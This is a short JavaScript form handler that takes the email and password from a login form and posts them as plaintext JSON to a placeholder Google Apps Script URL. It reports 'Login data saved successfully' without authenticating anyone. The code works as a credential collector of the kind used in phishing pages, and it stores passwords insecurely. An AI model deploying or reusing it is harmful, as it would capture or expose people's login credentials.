document.getElementById("loginForm").addEventListener("submit", function(event) {
    event.preventDefault();

    let email = document.getElementById("email").value;
    let password = document.getElementById("password").value;
    let responseMessage = document.getElementById("responseMessage");

    fetch("YOUR_GOOGLE_SCRIPT_URL", {
        method: "POST",
        mode: "no-cors",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({ email: email, password: password })
    })
    .then(() => {
        responseMessage.textContent = "Login data saved successfully!";
        responseMessage.style.color = "green";
        document.getElementById("loginForm").reset();
    })
    .catch((error) => {
        responseMessage.textContent = "Error: " + error.message;
        responseMessage.style.color = "red";
    });
});
